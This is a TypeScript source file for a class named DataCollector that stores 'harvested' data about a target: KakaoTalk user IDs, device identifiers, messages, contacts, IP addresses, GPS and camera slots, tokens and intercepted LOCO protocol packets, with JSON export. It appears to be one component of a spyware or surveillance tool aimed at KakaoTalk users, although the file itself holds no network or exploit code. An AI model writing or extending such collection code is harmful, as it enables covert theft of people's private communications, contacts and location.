/**
 * 🔥 DATA COLLECTOR v31.2 🔥
 */

import { HarvestedData, MessageData, ContactData, IPData, LOCOPacketData } from '../types';

export class DataCollector {
  private data: HarvestedData;

  constructor(sessionId: string) {
    this.data = {
      sessionId,
      user: {},
      gps: [],
      ip: [],
      camera: [],
      phone: [],
      contacts: [],
      messages: [],
      tokens: [],
      locoPackets: [],
      binaryPackets: [],
      protobufData: [],
      timestamp: new Date().toISOString()
    };
  }

  getData(): HarvestedData {
    return this.data;
  }

  addMessage(message: MessageData): void {
    this.data.messages.push(message);
    console.log(`[COLLECTOR] Added message from ${message.senderName}`);
  }

  addContact(contact: ContactData): void {
    const exists = this.data.contacts.some(c => c.kakaoId === contact.kakaoId);
    if (!exists) {
      this.data.contacts.push(contact);
      console.log(`[COLLECTOR] Added contact: ${contact.nickname}`);
    }
  }

  addIP(ip: IPData): void {
    this.data.ip.push(ip);
    console.log(`[COLLECTOR] Added IP: ${ip.ip} from ${ip.source}`);
  }

  addLOCOPacket(packet: LOCOPacketData): void {
    this.data.locoPackets.push(packet);
  }

  setUserData(userId: string, nickname: string, deviceUUID: string, deviceName: string): void {
    this.data.user = {
      kakaoId: userId,
      nickname,
      deviceUUID,
      deviceName,
      lastSeen: Date.now()
    };
    console.log(`[COLLECTOR] Set user data: ${nickname} (${userId})`);
  }

  getSummary(): string {
    return `Messages: ${this.data.messages.length}, Contacts: ${this.data.contacts.length}, IPs: ${this.data.ip.length}, Packets: ${this.data.locoPackets.length}`;
  }

  exportData(): string {
    return JSON.stringify(this.data, null, 2);
  }

  clear(): void {
    this.data.messages = [];
    this.data.contacts = [];
    this.data.ip = [];
    this.data.locoPackets = [];
    console.log('[COLLECTOR] Data cleared');
  }
}